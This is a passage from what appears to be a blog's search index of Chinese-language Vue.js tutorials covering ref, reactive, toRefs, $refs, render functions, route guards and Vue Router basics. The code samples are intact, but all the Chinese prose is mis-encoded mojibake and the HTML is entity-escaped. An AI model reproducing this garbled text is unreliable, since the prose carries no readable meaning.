// åˆå§‹å€¼ç‚º null const pTag = ref(null) // reference Object &amp; Node &lt;p&gt; const logRef = () =&gt; console.log(pTag, pTag.value) return { pTag, logRef } } }&lt;/script&gt; é™„è¨»ï¼šref å„²å­˜çš„å€¼æ˜¯ä¸€å€‹ Objectï¼Œå…¶ä¸­ value å±¬æ€§å°±æ˜¯æˆ‘å€‘å„²å­˜çš„å€¼ é€™æ¨£å­æˆ‘å€‘å°±èƒ½åœ¨æŒ‰ä¸‹æŒ‰éˆ•æ™‚æ‹¿åˆ° &lt;p&gt; çš„ DOM ç¯€é»ã€‚ é€™è£¡ä½ å¯èƒ½æœƒæƒ³èªª ref çš„åˆå§‹å€¼ç‚ºä»€éº¼è¦è¨­æˆ nullï¼Ÿé›£é“æ²’è¾¦æ³•ç›´æ¥è¨­ç‚º &lt;p&gt; å—ï¼Ÿ ç­”æ¡ˆæ˜¯æ²’æœ‰è¾¦æ³•ã€‚ æˆ‘å€‘å…ˆå›æ†¶ä¸€ä¸‹ setup çš„è§¸ç™¼æ™‚æ©Ÿã€‚å‰é¢æœ‰èªªé setup æ˜¯è·‘åœ¨æœ€ä¸€é–‹å§‹çš„ hookï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œåœ¨é€™å€‹æ™‚æ©Ÿé»æœ‰å¯èƒ½å­˜å–åˆ° DOM å…ƒç´ å—ï¼Ÿç•¶ç„¶ä¸å¯èƒ½ï¼Œæ‰€ä»¥æ‰éœ€è¦é€éé€™æ¨£çš„æ–¹å¼ä¾†åšï¼š æŠŠ pTag return åˆ°å¤–é¢è®“å®ƒè·Ÿ template åšç¹«çµ é€é logRef é€™ç¨® callback çš„å½¢å¼ä¾†å°å‡º pTag çš„å€¼ æ‰€ä»¥è¦åœ¨ setup ä¸­å»æ“ä½œ DOM å…ƒç´ ä¹Ÿæ˜¯ä¸å¯èƒ½çš„ï¼Œå› ç‚º setup åŸ·è¡Œçš„ç•¶ä¸‹ä¸¦æ²’æœ‰ä»»ä½• DOM çš„å­˜åœ¨ã€‚ ç¸½ä¹‹é€™å€‹è§€å¿µè¦ä¸€å®šè¦éŠ˜è¨˜åœ¨å¿ƒã€‚ ref æ›´å¤§çš„ç”¨é€”ï¼ˆReactiveï¼‰ref é™¤äº†æ‹¿ä¾†å­˜å– DOM å…ƒç´ ä»¥å¤–ï¼Œæ›´å¸¸è¢«ç”¨ä¾†è¨­ç½®ã€ŒReactiveã€ çš„å€¼ã€‚ å‰é¢æˆ‘å€‘æœ‰èªªéåœ¨ setup ä¸­å»ºç«‹çš„è®Šæ•¸åœ¨é è¨­ä¸‹æ²’æœ‰è¾¦æ³•ã€Œéš¨è‘—æ›´æ–°åæ‡‰åˆ°ç•«é¢ä¸Šã€ï¼Œä½†æ˜¯å¦‚æœæ”¹ç”¨ ref å°±å¯ä»¥æ”¹è®Šé€™ä»¶äº‹æƒ…ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, my name is {{ name }}, and I'm {{ age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;button @click=\"age++\"&gt;Add 1 to age&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { ref } from 'vue' export default { setup() { const name = ref('PeaNu') const age = ref(24) const changeName = () =&gt; { name.value = 'PPB' } return { name, age, changeName } } }&lt;/script&gt; ref(...) æœƒå»ºç«‹ä¸€å€‹ç‰©ä»¶ï¼Œä¸¦ä¸”æŠŠæˆ‘å€‘å„²å­˜çš„å€¼æ”¾åœ¨ value å±¬æ€§ä¸Šï¼Œå°±è·Ÿ React çš„ useRef æœƒå„²å­˜åœ¨ current å±¬æ€§ä¸Šæ˜¯ä¸€æ¨£çš„æ¦‚å¿µã€‚ æ¥è‘—ç•¶æˆ‘å€‘é€é changeName ä¾†æ›´æ–°å€¼çš„æ™‚å€™ï¼Œç¥å¥‡çš„äº‹æƒ…å°±ç™¼ç”Ÿäº†ï¼Œç•«é¢ä¸Šçš„ name æœƒç¢ºå¯¦æœƒè¢«åŒæ­¥æ›´æ–°ç‚º PPBï¼Œå› ç‚ºç¾åœ¨é€™å€‹ name æ˜¯ã€ŒReactiveã€çš„ã€‚ å¦ä¸€ç¨®ä½œæ³•ï¼šreactiveè¦è®“ä¸€å€‹è®Šæ•¸è®Šæˆ Reactive é‚„æœ‰å¦ä¸€å€‹æ–¹æ³•ï¼Œå°±æ˜¯æ”¹ç”¨ reactive ä¾†å»ºç«‹ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920212223&lt;template&gt; &lt;div class=\"home\"&gt; &lt;p&gt;Hello, my name is {{ user.name }}, and I'm {{ user.age }} years old&lt;/p&gt; &lt;button @click=\"changeName\"&gt;Click Me&lt;/button&gt; &lt;button @click=\"user.age++\"&gt;Add 1 to age&lt;/button&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import { reactive } from 'vue' export default { setup() { // å»ºç«‹ reactive ç‰©ä»¶ const user = reactive({ name: 'PeaNu', age: 24 }) const changeName = () =&gt; { user.name = 'PPB' } return { user, changeName } } }&lt;/script&gt; é€™æ¨£å­ä¹Ÿå¯ä»¥é”åˆ°ä¸€æ¨£çš„æ•ˆæœï¼Œä¸éè¦æ³¨æ„ reactive çš„å€¼å¿…é ˆæ˜¯ä¸€å€‹ã€ŒObjectã€ï¼Œå®ƒæ²’è¾¦æ³•å­˜ã€ŒPrimitiveã€çš„å€¼ã€‚ æ‰€ä»¥æˆ‘æ‰æœƒæ”¹æˆç”¨ user ä¾†å»ºç«‹ç‰©ä»¶ï¼Œè€Œä¸æ˜¯åƒ ref ä¸€æ¨£ç”¨ã€Œç´”å€¼ã€ä¾†å„²å­˜ã€‚ ç¸½ä¹‹å…©ç¨®æ–¹æ³•éƒ½æ˜¯ OK çš„ï¼Œä¸éä½ æ‡‰è©²æœƒæ¯”è¼ƒå¸¸çœ‹åˆ° reactive çš„ä½œæ³•ã€‚ reactive çš„å¥½å¤¥ä¼´ï¼štoRefså‰›å‰›å»ºç«‹çš„ reactive ç¯„ä¾‹ä¸­æœ‰ä¸€å€‹éº»ç…©çš„é»æ˜¯ã€Œå¿…é ˆé€éå­˜å–å±¬æ€§çš„æ–¹å¼ä¾†å–å€¼ã€ï¼Œåƒæ˜¯ 123456&lt;template&gt; &lt;div class=\"home\"&gt; &lt;!-- å¾—é€é user ä¾†å–å¾— name --&gt; &lt;p&gt;Hello, my name is {{ user.name }}, and I'm {{ user.age }} years old&lt;/p&gt; &lt;/div&gt;&lt;/template&gt; å¦‚æœèƒ½å¤ åƒ ref ä¸€æ¨£ç›´æ¥å¡« name çš„è©±å°±æ›´å¥½äº†å°å§ï¼æ‰€ä»¥ Vue æä¾›äº† toRefsï¼ˆæ³¨æ„æœ‰ sï¼‰é€™å€‹æ–¹æ³•ï¼Œç”¨é€”å°±æ˜¯æŠŠ reactive çš„æ¯å€‹å±¬æ€§è½‰æˆ refï¼Œåƒé€™æ¨£ï¼š 123456789101112&lt;script&gt; import { reactive, toRefs } from 'vue' export default { setup() { const user = reactive({ name: 'PeaNu', age: 24 }) // toRefs æœƒå›å‚³ { ref1: ..., ref2: ... }ï¼Œæ‰€ä»¥é€™é‚Šå¯ä»¥è§£æ§‹ return { ...toRefs(user) } } }&lt;/script&gt; æˆ‘ç§å¿ƒè¦ºå¾—é€™æ¨£æ˜¯æœ€æ–¹ä¾¿çš„ä½œæ³•ï¼Œå› ç‚ºï¼š åœ¨ template ä¸­ä¸ç”¨å†é€é obj.property ä¾†å­˜å– åœ¨ script ä¸­ä¸ç”¨å†é€é ref.value ä¾†å­˜å–è³‡æ–™ ç¸½çµä¾†èªªå°±æ˜¯ä¸€èˆ‰å…©å¾—ï¼ŒçœŸçš„æ˜¯å¾ˆæ£’çš„åŠŸèƒ½ã€‚","link":"/2022/08/12/vue-ref-and-reactive/"},{"title":"Vueï¼å–å¾— DOM å…ƒç´ ï¼ˆ$refï¼‰","text":"ä¼¼æ›¾ç›¸ä¼¼ã€‚ æœ‰æ™‚å€™ä½ å¯èƒ½æœƒæƒ³ç›´æ¥æ“ä½œ DOM å…ƒç´ ï¼Œé€™æ™‚å€™èƒ½é€™æ¨£åšï¼š 123456789101112131415161718192021222324&lt;template&gt; &lt;div class=\"wrap\"&gt; &lt;!-- åŠ ä¸Š ref å±¬æ€§ --&gt; &lt;input type=\"text\" ref=\"inputElem\" /&gt; &lt;button @click=\"handleClick\" /&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; import Button from './components/Button.vue' export default { name: 'App', components: { Button }, methods: { handleClick() { // &lt;input type=\"text\"&gt; ç¯€é» console.log(this.$refs.inputElem) } } }&lt;/script&gt; åŠ ä¸Š ref å±¬æ€§çš„å…ƒç´ å¯ä»¥é€é this.$ref.åç¨± ä¾†å­˜å–ã€‚ ä¸Šé¢æˆ‘å€‘æŠŠ input åŠ ä¸Š ref=\"inputElem\"ï¼Œæ‰€ä»¥åœ¨ handler ä¸­å°±å¯ä»¥ç”¨ this.$ref ä¾†å–å¾—ã€‚ é›–ç„¶é€™æ±è¥¿åœ¨ Composition API è£¡æœ‰å¦ä¸€å€‹ç”¨é€”ï¼Œä¸éåˆ°æ™‚å€™å†èªªå§ã€‚","link":"/2022/08/01/vue-ref/"},{"title":"Vueï¼å¥½åƒå¾ˆç¥ç§˜çš„ã€Œhã€","text":"é‚„æ˜¯è‡ªå·±å¯«çš„ç­†è¨˜æ¯”è¼ƒå¥½æ‡‚ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªä»–åªæ˜¯å¦ä¸€ç¨®å»ºç«‹ã€ŒComponentã€çš„æ–¹å¼ï¼Œå¹³å¸¸æˆ‘å€‘éƒ½æ˜¯ç”¨ SFC ä¾†å»ºç«‹ï¼Œåƒé€™æ¨£ï¼š 12345678910111213&lt;template&gt; &lt;div class=\"navbar\"&gt; &lt;div class=\"container\"&gt; &lt;div&gt; &lt;h1&gt;The dojo&lt;/h1&gt; &lt;/div&gt; &lt;div class=\"links\"&gt; &lt;router-link :to=\"{ name: 'Home' }\"&gt;Home&lt;/router-link&gt; &lt;router-link :to=\"{ name: 'Create' }\"&gt;Create&lt;/router-link&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; è€Œ h å…¶å¯¦åªæ˜¯å¦ä¸€ç¨®å»ºç«‹ Component çš„æ–¹å¼ï¼Œä»–æ˜¯é€éã€ŒFunctionã€ä¾†å»ºç«‹ï¼Œå¯«èµ·ä¾†æœƒåƒé€™æ¨£çš„æ„Ÿè¦ºï¼š 12345678910111213141516// @/components/VNode.jsimport { h } from 'vue'export default function VNode() { return { render() { return h(`h${this.level}`, { id: 'heading' }, this.$slots.default()) }, props: { level: { type: Number, required: true } } }} æ¥è‘—åœ¨æŠŠå®ƒ Register åˆ°æŸå€‹å…ƒä»¶ä¸Šå°±èƒ½ç”¨äº†ï¼Œåƒé€™æ¨£ï¼š 123456789101112131415161718&lt;template&gt; &lt;div&gt;My VNode&lt;/div&gt; &lt;heading :level=\"1\"&gt;Heading 1&lt;/heading&gt; &lt;heading :level=\"2\"&gt;Heading 2&lt;/heading&gt; &lt;heading :level=\"3\"&gt;Heading 3&lt;/heading&gt; &lt;heading :level=\"4\"&gt;Heading 4&lt;/heading&gt; &lt;heading :level=\"5\"&gt;Heading 5&lt;/heading&gt;&lt;/template&gt;&lt;script&gt; import VNode from './components/VNode' export default { components: { heading: VNode() // å› ç‚ºæ˜¯å‡½å¼æ‰€ä»¥è¦è¨˜å¾— invoke } }&lt;/script&gt; é™„è¨»ï¼šé€™æ¨£çœ‹å¾ˆæŠ½è±¡çš„è©±åˆ°å¯ä»¥çœ‹æˆ‘å¯«çš„ç¯„ä¾‹ é€™é‚Šåªæ˜¯é€é level ä¾†æ±ºå®šè¦æ¸²æŸ“å‡º &lt;h1&gt; é‚„æ˜¯ &lt;h2&gt; ç­‰ç­‰ï¼Ÿå°±é€™éº¼å–®ç´”ï¼ ä¸éä½ å¯èƒ½æœƒæƒ³èªªã€Œå¥½å¥½çš„ SFC ä¸å¯«ï¼Œå¯«æˆé€™æ¨£æ˜¯åœ¨å“ˆå›‰ï¼Ÿã€ è®“æˆ‘å€‘ä¾†çœ‹çœ‹å¯«æˆ SFC çš„è©±æœƒé•·ä»€éº¼æ¨£å­ï¼š 1234567891011121314151617181920212223242526272829303132&lt;!-- @/components/VNode2.js --&gt;&lt;template&gt; &lt;h1 v-if=\"level === 1\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h1&gt; &lt;h2 v-else-if=\"level === 2\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h2&gt; &lt;h3 v-else-if=\"level === 3\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h3&gt; &lt;h4 v-else-if=\"level === 4\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h4&gt; &lt;h5 v-else-if=\"level === 5\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h5&gt; &lt;h6 v-else-if=\"level === 6\"&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/h6&gt;&lt;/template&gt;&lt;script&gt; export default { props: { level: { type: Number, required: true } } }&lt;/script&gt; 123456789101112131415161718&lt;template&gt; &lt;p&gt;My VNode&lt;/p&gt; &lt;VNode :level=\"1\"&gt;Heading1&lt;/VNode&gt; &lt;VNode :level=\"2\"&gt;Heading2&lt;/VNode&gt; &lt;VNode :level=\"3\"&gt;Heading3&lt;/VNode&gt; &lt;VNode :level=\"4\"&gt;Heading4&lt;/VNode&gt; &lt;VNode :level=\"5\"&gt;Heading5&lt;/VNode&gt;&lt;/template&gt;&lt;script&gt; import VNode from './components/VNode2' export default { components: { VNode } }&lt;/script&gt; ä¸æ‡‚çš„è©±ä¸€æ¨£åˆ°é€™é‚Šçœ‹ç¯„ä¾‹ã€‚ é€™æ¨£ä½ æ‡‰è©²æ˜ç™½å·®åˆ¥åœ¨å“ªäº†å§ï¼Ÿä¸€å€‹æ˜¯ã€Œå¯è®€æ€§ã€æ¯”è¼ƒå¥½ï¼Œä½†å¯«é‚è¼¯å¾ˆéº»ç…©ï¼Œå¦ä¸€å€‹æ˜¯å¯è®€æ€§å¾ˆçˆ›ï¼Œä½†æ–¹ä¾¿ã€Œè™•ç†é‚è¼¯ã€çš„éƒ¨åˆ†ã€‚ æ‰€ä»¥åœ¨æŸäº›æƒ…æ³ä¸‹ render function å¯èƒ½æœƒæ˜¯ä¸€å€‹æ›´å¥½çš„é¸æ“‡ã€‚","link":"/2022/08/08/vue-render-function/"},{"title":"Vueï¼Router Guard","text":"æ¬Šé™ç®¡ç†å¾ˆé‡è¦ã€‚ ç°¡è¿°æœ‰æ™‚å€™æˆ‘å€‘æœƒå¸Œæœ›ã€ŒæŸäº›è·¯ç”±ã€å¿…é ˆã€Œç¬¦åˆæ¢ä»¶ã€æ‰å¯ä»¥é€²å…¥ï¼Œä¾‹å¦‚èªªåƒé€™æ¨£çš„è·¯ç”±ï¼š 123456789101112const routes: Array&lt;RouteRecordRaw&gt; = [ { path: '/', name: 'Home', component: Home }, { path: '/chatroom', name: 'ChatRoom', component: ChatRoom }] å¯ä»¥å¤§æ¦‚çœ‹å‡ºé€™æ˜¯ä¸€å€‹ç°¡å–®çš„èŠå¤©å®¤ï¼Œä¸éæˆ‘å¸Œæœ› /chatroom åªèƒ½çµ¦ã€Œå·²ç¶“ç™»å…¥çš„äººã€é€²å…¥ï¼Œæ²’ç™»å…¥çš„è©±æˆ‘æƒ³æŠŠå®ƒå°å›é¦–é å»ï¼Œé‚£éº¼æˆ‘å¯ä»¥é€™æ¨£åšï¼š 1234567891011121314151617181920212223242526const routes: Array&lt;RouteRecordRaw&gt; = [ { path: '/', name: 'Home', component: Home }, { path: '/chatroom', name: 'ChatRoom', component: ChatRoom, beforeEnter: ( to: RouteLocationNormalized, from: RouteLocationNormalized, next: NavigationGuardNext ) =&gt; { // æª¢æŸ¥ç›®å‰çš„ user è³‡è¨Š const currentUser = auth.currentUser // å¦‚æœå­˜åœ¨å°±é€šéï¼Œä¸ç„¶å°±å°å›é¦–é  if (currentUser) { next() } else { next({ name: 'Home' }) } } }] é€™é‚Šç”¨åˆ°äº† beforeEnter é€™å€‹ hookï¼Œèªªç©¿äº†å°±åªæ˜¯ä¸€å€‹ functionï¼ŒVue æœƒåœ¨ã€Œé€²å…¥è·¯ç”±ä¹‹å‰ã€å¹«ä½  trigger ä»–ï¼Œè®“ä½ èƒ½å¤ åœ¨é€²å…¥å‰åšæŸäº›äº‹ã€‚ éŒ¯èª¤çŸ¥è­˜è£œå……æˆ‘åŸæœ¬ä»¥ç‚º next çš„éƒ¨åˆ†å¯ä»¥é€™æ¨£å­å¯«ï¼š 1next(currentUser ? to : from) ä½†é€™æ¨£æ˜¯ä¸å°çš„ï¼Œæœƒé™·å…¥ç„¡é™è¿´åœˆã€‚ å¦‚æœä½ åªæ˜¯æƒ³è®“ä»–ã€Œåˆ°ä»–åŸæœ¬è©²å»çš„åœ°æ–¹ã€ï¼Œè«‹ç›´æ¥å‘¼å« next() å°±å¥½ï¼Œä¸éœ€è¦å†é¡å¤–å¸¶åƒæ•¸é€²å»ã€‚å› ç‚ºå¸¶äº†åƒæ•¸å°±æœƒè¢«è¦–ç‚ºã€Œé‡æ–°å°å‘ã€ï¼Œè®Šæˆé€™æ¨£çš„æµç¨‹ï¼š æª¢æŸ¥ currentUserï¼Œæœ‰çš„è©±å°å‘ /chatroom åŸ·è¡Œé€²å…¥ /chatroom å‰çš„ beforeEnter æª¢æŸ¥ currentUserï¼Œæœ‰çš„è©±å°å‘ /chatroom åŸ·è¡Œé€²å…¥ /chatroom å‰çš„ beforeEnter â€¦ ä»¥ä¸Šè£œå……å…§å®¹å°±åˆ°é€™é‚Šï¼Œæ¥è‘—ä¾†ç¹¼çºŒä»‹ç´¹ã€‚ åªè¦æ˜¯è·¯ç”±ç›¸é—œçš„ hook éƒ½æœƒè‡ªå‹•æ¥æ”¶ toã€from å’Œ next é€™äº›åƒæ•¸ã€‚ to å’Œ from åˆ†åˆ¥ç‚ºã€Œç›®çš„åœ°ã€å’Œã€Œå‡ºç™¼åœ°ã€çš„ç‰©ä»¶ï¼Œå…§å®¹å¤§æ¦‚é•·é€™æ¨£ï¼š é™„è¨»ï¼šé€™æ˜¯æŠŠ to å°å‡ºä¾†çš„çµæœ ç°¡å–®ä¾†èªªå°±æ˜¯è·¯ç”±ç›¸é—œçš„è³‡è¨Šï¼Œæœ‰æ™‚å€™ä½ å¯èƒ½æœƒç”¨åˆ°å®ƒä¾†åšåˆ¤æ–·ã€‚ è‡³æ–¼ next å°±ä¸ä¸€æ¨£äº†ï¼Œä»–æ˜¯ä¸€å€‹ functionï¼Œç”¨ä¾†æ±ºå®šã€Œæœ€å¾Œè¦è·³è½‰å»å“ªè£¡ï¼Ÿã€ï¼Œå¦‚æœæ²’æœ‰å‘¼å«ä»–çš„è©±å°±ä¸æœƒåšä»»ä½•äº‹æƒ…ï¼Œåœç•™åœ¨åŸåœ°ä¸€å‹•ä¹Ÿä¸å‹•ã€‚ æ‰€ä»¥æˆ‘å€‘ä¸€é–‹å§‹çš„ä¾‹å­å°±åªæ˜¯åšäº†ä»¥ä¸‹å¹¾ä»¶äº‹ï¼š æª¢æŸ¥ currentUser æœ‰æ²’æœ‰å€¼ï¼Ÿ æœ‰çš„è©±ï¼ŒæŠŠä»–å°å‘è‡³ to çš„ä½ç½®ï¼ˆ/chatrromï¼‰ æ²’æœ‰çš„è©±ï¼ŒæŠŠä»–å°å‘è‡³ from çš„ä½ç½®ï¼ˆ/ï¼‰ é€™æ¨£ä¸€ä¾†å°±å¯ä»¥é¿å…æ‰ã€Œæ²’ç™»å…¥çš„äººã€é€²åˆ°èŠå¤©å®¤äº†ï¼","link":"/2022/08/25/vue-router-guard/"},{"title":"Vueï¼Router","text":"å­¸ SPA çš„å¥½æœ‹å‹ã€‚ ç°¡è¿°é›–ç„¶å¾ˆä¹…å¾ˆä¹…ä»¥å‰æœ‰å¯«é Vue-Routerï¼Œä¸éé‚£æ¬¡å¯¦åœ¨æ˜¯â€¦å¯«å¾—æ²’æœ‰å¾ˆå¥½ï¼Œæƒ³èµ·ä¾†éƒ½è¦ºå¾—é»‘æ­·å² XDï¼Œä¸éè—‰ç”±é€™æ¬¡é‡æº« Vue å¯ä»¥ä¾†å¥½å¥½ç·´ç¿’ä¸€ä¸‹ã€‚ èµ·æ‰‹å¼é€™é‚Šçš„ç¯„ä¾‹æœƒç”¨ Vue-CLI ä¾†å¾é ­å»ºç«‹é™„å¸¶ã€ŒVue-Routerã€çš„å°ˆæ¡ˆï¼Œåæ­£ä¸»è¦æ˜¯è¦ç·´ç¿’è·¯ç”±çš„è§€å¿µï¼Œç­‰ä½ æ‡‚äº†ä»¥å¾Œè¦åœ¨ç¾æœ‰å°ˆæ¡ˆè£¡é¢å°å…¥æ‡‰è©²ä¹Ÿä¸æœƒæœ‰å¤ªå¤§å•é¡Œã€‚ å°ˆæ¡ˆå»ºå¥½å¾Œå…ˆæ³¨æ„åˆ° /src/router/index.js é€™å€‹æª”æ¡ˆï¼š 1234567891011121314151617181920212223242526272829import { createRouter, createWebHistory } from 'vue-router'import HomeView from '../views/HomeView.vue'import AboutView from '../views/AboutView.vue'const routes = [ { path: '/', name: 'home', component: HomeView }, { path: '/about', name: 'about', component: AboutView // é€™æ˜¯é è¨­çš„è¨­å®šï¼Œæˆ‘ä¸‹é¢æœƒå†è§£é‡‹ // route level code-splitting // this generates a separate chunk (about.[hash].js) for this route // which is lazy-loaded when the route is visited. // component: () =&gt; import(/* webpackChunkName: \"about\" */ '../views/AboutView.vue') }]const router = createRouter({ history: createWebHistory(process.env.BASE_URL), routes})export default router é¦–å…ˆè¦åœ¨ Vue å»ºç«‹è·¯ç”±çš„åŸºæœ¬æ…£ä¾‹æ˜¯å¯«ä¸€éš»ç¨ç«‹çš„ router.jsï¼Œåªè¦æ˜¯è·Ÿè·¯ç”±æœ‰é—œçš„æ±è¥¿éƒ½æœƒå…¨éƒ¨å¯«åœ¨é€™è£¡ã€‚é€™å€‹è·Ÿ React ç›´æ¥å¡åœ¨ Component ä¸­çš„åšæ³•é‚„è »ä¸ä¸€æ¨£çš„ï¼Œæˆ‘è¦ºå¾—å„æœ‰å„çš„å¥½è™•ã€‚ æ¥è‘—ä¾†ä¸€æ®µä¸€æ®µè§£é‡‹ code çš„éƒ¨åˆ†ï¼š const routes = [{...}] é™£åˆ—ä¸­çš„æ¯å€‹ç‰©ä»¶éƒ½ä»£è¡¨ä¸€å€‹è·¯ç”±ï¼Œåƒ '/' æœƒå°æ‡‰åˆ° HomeViewï¼Œ/about æœƒå°æ‡‰çš„ AboutViewï¼Œé€™å€‹æ‡‰è©²è »å¥½ç†è§£çš„ã€‚ const router = createRouter({{...}) å‰é¢æ˜¯è¨­å®šè·¯ç”±ï¼Œé€™é‚Šæ‰æ˜¯æ­£å¼é…ç½®ï¼ˆRegisterï¼‰è·¯ç”±ï¼Œå…¶å¯¦å°±æ˜¯é€é Vue-Router æä¾›çš„ method ä¾†åšé…ç½®ï¼Œé€™é‚Šè¨­å®šäº†å…©å€‹æ±è¥¿ï¼š ä½¿ç”¨ history APIï¼Œå¦ä¸€ç¨®æ˜¯ hash APIï¼Œç°¡å–®ä¾†èªªå°±æ˜¯ç¶²å€æœ‰æ²’æœ‰ # çš„å·®åˆ¥ï¼ˆä½†å¦‚æœä½ æœ‰è¦éƒ¨ç½²çš„è©±æœ€å¥½æ˜¯å¤šçœ‹ä¸€äº›è³‡æ–™ææ¸…æ¥šå¯¦éš›å·®åˆ¥ï¼Œä¸ç„¶ä¸€å®šæœƒè¸©é›·ï¼‰ è¨­å®šè·¯ç”±è³‡æ–™ï¼ˆå°±æ˜¯å‰é¢å»ºç«‹çš„ routesï¼‰ è‡³æ–¼æˆ‘è¨»è§£èµ·ä¾†çš„é‚£ä¸€æ®µæ˜¯è·Ÿã€Œå»¶é²è¼‰å…¥ã€ç›¸é—œçš„è¨­å®šã€‚ç°¡å–®ä¾†èªªå°±æ˜¯ç­‰æˆ‘ã€Œé€²åˆ°é‚£å€‹è·¯ç”±æ™‚å†å¹«æˆ‘åŠ è¼‰éœ€è¦çš„ JS å°±å¥½ï¼Œä¸éœ€è¦åœ¨ä¸€é–‹å§‹å°±è¼‰å…¥æ‰€æœ‰è·¯ç”±ã€ï¼ŒçŸ¥é“é€™æ¨£å°±å·®ä¸å¤šäº†ï¼Œå¦‚æœçœŸçš„æƒ³çŸ¥é“ç´°ç¯€å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚ router-linkï¼å¸¶ä½ è¶´è¶´èµ°æ¥è‘—ä¾†ä»‹ç´¹ Vue-Router æä¾›çš„å…ƒä»¶ &lt;router-link&gt;ï¼Œæ‰“é–‹ /src/views/App.vue æœƒçœ‹åˆ°é€™å€‹å…§å®¹ï¼š 1234567&lt;template&gt; &lt;nav&gt; &lt;router-link to=\"/\"&gt;Home&lt;/router-link&gt; | &lt;router-link to=\"/about\"&gt;About&lt;/router-link&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt; å®ƒçš„ç”¨é€”å°±è·Ÿ &lt;a&gt; å¾ˆåƒï¼Œä¸éæœ‰ä¸€å€‹å¾ˆå¤§çš„å·®åˆ¥åœ¨æ–¼ï¼šæœƒä¸æœƒç™¼ request å»æ‹¿ HTMLã€‚ &lt;a&gt; çš„é è¨­è¡Œç‚ºå°±æ˜¯æœƒç™¼ä¸€å€‹ request åˆ° serverï¼Œä½†æˆ‘å€‘åœ¨å¯« Vue çš„æ™‚å€™ä¸¦ä¸æƒ³è¦é€™å€‹è¡Œç‚ºï¼Œæ‰€ä»¥æ‰æœƒæœ‰ &lt;router-link&gt; é€™å€‹æ±è¥¿ä¾†å–ä»£å®ƒã€‚ é †é“ä¸€æï¼Œ&lt;router-view /&gt; å°±æ˜¯ç”¨ä¾†é¡¯ç¤ºæŸå€‹è·¯ç”±çš„å…§å®¹ï¼Œå¯ä»¥æƒ³æˆæ˜¯ React çš„ &lt;Routes&gt;ï¼š 12345678910111213141516function App() { return ( &lt;Router&gt; &lt;nav&gt; &lt;Link to='/'&gt;Home&lt;/Link&gt; &lt;Link to='/about'&gt;About&lt;/Link&gt; &lt;/nav&gt; {/* router-view */} &lt;Routes&gt; &lt;Route {...props} /&gt; &lt;Route {...props} /&gt; &lt;Route {...props} /&gt; &lt;/Routes&gt; &lt;/Router&gt; )} æ¥ä¸‹ä¾†è£œå……ä¸€äº› router-link çš„ç‰¹æ€§ï¼Œé€™äº›ç‰¹æ€§åœ¨æŸäº›æ™‚å€™é‚„è »æ–¹ä¾¿çš„ã€‚ è‡ªå¸¶ active classå‡è¨­æˆ‘ç¾åœ¨åœ¨ /about çš„è·¯ç”±ï¼Œé‚£å°æ‡‰çš„ link å°±æœƒæœ‰é€™æ¨£çš„ classï¼š æœƒè‡ªå‹•æ·»åŠ  router-link-active å’Œ router-link-exact-activeï¼Œé€šå¸¸æœƒæ‹¿å¾Œé¢æ‹¿å€‹ä¾†ç”¨ï¼ˆå®Œå…¨åŒ¹é…ï¼‰ã€‚ ç¸½ä¹‹å¦‚æœä½ æƒ³è¦é‡å° current åš active æ¨£å¼çš„è©±é€™æœƒæ˜¯ä¸€å€‹å¾ˆæ–¹ä¾¿çš„æ©Ÿåˆ¶ã€‚ å‹•æ…‹è·¯å¾‘é™¤äº†åŸæœ¬çš„å¯«æ³•ä»¥å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç”¨ v-bind çš„æ–¹å¼ä¾†æŒ‡å®šï¼Œé€™å€‹æˆ‘ç›´æ¥ç¤ºç¯„æ¯”è¼ƒå¿«ï¼š 1234567&lt;template&gt; &lt;nav&gt; &lt;router-link :to=\"{ name: 'home' }\"&gt;Home&lt;/router-link&gt; | &lt;router-link :to=\"{ name: 'about' }\"&gt;About&lt;/router-link&gt; &lt;/nav&gt; &lt;router-view /&gt;&lt;/template&gt; è£¡é¢å¯ä»¥å‚³å…¥æˆ‘å€‘åœ¨ router.js ä¸­å¯«å¥½çš„ routes ç‰©ä»¶ä¾†åšå°æ‡‰ï¼ˆå¿˜è¨˜å…§å®¹çš„è©±å¯ä»¥æ‹‰å›å»ä¸Šé¢çœ‹ï¼‰ã€‚ é›–ç„¶æˆ‘è¦ºå¾—é€™æ¨£çš„ç¼ºé»æ˜¯æ²’è¾¦æ³•ä¸€çœ¼çœ‹å‡ºç¶²å€æ˜¯å•¥ï¼Œä¸éæ›ä¾†çš„å¥½è™•æ˜¯ç•¶ä½ è¦æ”¹ path æ™‚å®Œå…¨ä¸éœ€è¦ä¾†æ”¹ &lt;router-link&gt;ï¼Œå› ç‚ºä»–æ˜¯åƒè€ƒ name çš„å€¼ï¼Œæˆ‘è¦ºå¾—é€™åœ¨å¤§å‹å°ˆæ¡ˆä¸Šæœƒæ˜¯å¾ˆå¤§çš„å„ªå‹¢ã€‚ å‹•æ…‹è·¯ç”±åƒæ•¸å‡è¨­ä½ æœ‰ä¸€å€‹è·¯ç”±æ˜¯ /Productsï¼Œè€Œå®ƒåº•ä¸‹å¯èƒ½æœƒæœ‰ä¸åŒçš„ç”¢å“é é¢ï¼Œæœƒç”¨ /Products/A æˆ– /Products/B ä¹‹é¡çš„æ–¹å¼ä¾†è¡¨ç¤ºã€‚ é€™å€‹æ™‚å€™ä½ ä¸å¯èƒ½å» hardcode 